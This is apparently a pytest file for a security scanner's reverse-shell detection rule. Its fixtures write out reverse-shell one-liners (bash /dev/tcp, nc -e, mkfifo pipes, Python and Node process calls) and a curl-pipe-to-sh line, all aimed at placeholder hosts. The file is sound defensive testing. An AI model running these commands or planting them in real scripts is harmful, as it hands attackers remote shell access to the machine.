"""ST-POSTEX-REVERSE-SHELL: a reverse shell the code runs itself against a host written into it.

A setup script that opens `bash -i >& /dev/tcp/host/port` used to be the risky construct
ST-POSTEX-REMOTE-ACCESS alone, which rated the component LOW. A shell bound to a literal address has
no honest reading, so that shape is a malicious indicator of its own; a helper that takes the
listener from an argument, a printed line and a signature list stay where they were.

Samples are inert: TEST-NET addresses and `.invalid` hosts.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory

R_SHELL = "ST-POSTEX-REVERSE-SHELL"
R_ACCESS = "ST-POSTEX-REMOTE-ACCESS"


def _report(tmp_path: Path, name: str, text: str):
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="")
    return analyze_directory(tmp_path, detect_component(tmp_path, source=str(tmp_path)))


@pytest.mark.parametrize(("name", "text"), [
    ("setup.sh", "#!/bin/bash\nbash -i >& /dev/tcp/c2.example.invalid/4444 0>&1\n"),
    ("setup.sh", "#!/bin/sh\nsh -i >& /dev/udp/203.0.113.9/53 0>&1\n"),
    ("setup.sh", "exec 5<>/dev/tcp/203.0.113.9/4444 0>&1\n"),
    ("setup.sh", "nc 203.0.113.9 4444 -e /bin/sh\n"),
    ("setup.sh", "ncat -e /bin/bash c2.example.invalid 4444\n"),
    ("setup.sh", "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | "
                 "nc c2.example.invalid 4444 > /tmp/f\n"),
    ("setup.sh", "nohup bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1' &\n"),
    ("run.py", 'import os\nos.system("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")\n'),
    ("run.py", 'import subprocess\n'
               'subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"])\n'),
    ("run.js", 'const { exec } = require("child_process");\n'
               'exec("nc 203.0.113.9 4444 -e /bin/sh");\n'),
])
def test_reverse_shell_to_a_literal_host_is_malicious(tmp_path: Path, name: str, text: str):
    report = _report(tmp_path, name, text)
    ids = {f.id for f in report.findings}
    assert R_SHELL in ids, ids
    # Reported once: the same line is not also the weaker remote-access finding.
    assert R_ACCESS not in ids, ids
    assert report.verdict["has_malicious_indicators"] is True
    finding = next(f for f in report.findings if f.id == R_SHELL)
    assert all(e.file == name and e.line_start >= 1 and e.snippet for e in finding.evidence)


@pytest.mark.parametrize(("name", "text"), [
    # The listener is an argument or a variable: a tool pointed at the tester's own machine.
    ("connect.sh", 'bash -i >& "/dev/tcp/$LHOST/$LPORT" 0>&1\n'),
    ("connect.sh", 'nc "$1" "$2" -e /bin/sh\n'),
    # Printed for a person to read.
    ("help.sh", 'echo "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"\n'),
    # A payload generator builds the line as text and prints it.
    ("gen.py", 'def line(ip, port):\n'
               '    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"\n'
               'print(line("203.0.113.9", 4444))\n'),
    # A string that no process call receives.
    ("gen.py", 'EXAMPLE = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"\nprint(EXAMPLE)\n'),
    # A signature list of a security tool.
    ("sigs.py", 'SIGNATURES = [\n'
                '    "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",\n'
                '    "nc 203.0.113.9 4444 -e /bin/sh",\n'
                '    "curl http://203.0.113.9/x | sh",\n'
                ']\n'),
    # A comment, and a port probe.
    ("a.sh", "# bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"),
    ("a.sh", 'timeout 1 bash -c "</dev/tcp/203.0.113.9/443" && echo up\n'),
])
def test_tools_prints_and_lists_are_not_the_malicious_shape(tmp_path: Path, name: str, text: str):
    report = _report(tmp_path, name, text)
    assert R_SHELL not in {f.id for f in report.findings}
    assert report.verdict["has_malicious_indicators"] is False


def test_corpus_samples(tmp_path: Path):
    corpus = Path(__file__).parent / "eval_corpus"
    for rel, expected in (
        ("positive/AST01/post-exploitation/shell-setup-reverse-shell", True),
        ("positive/AST01/post-exploitation/python-system-netcat-shell", True),
        ("negative/AST01/post-exploitation/listener-address-from-argument", False),
    ):
        root = corpus / rel
        report = analyze_directory(root, detect_component(root, source=str(root)))
        assert (R_SHELL in {f.id for f in report.findings}) is expected, rel
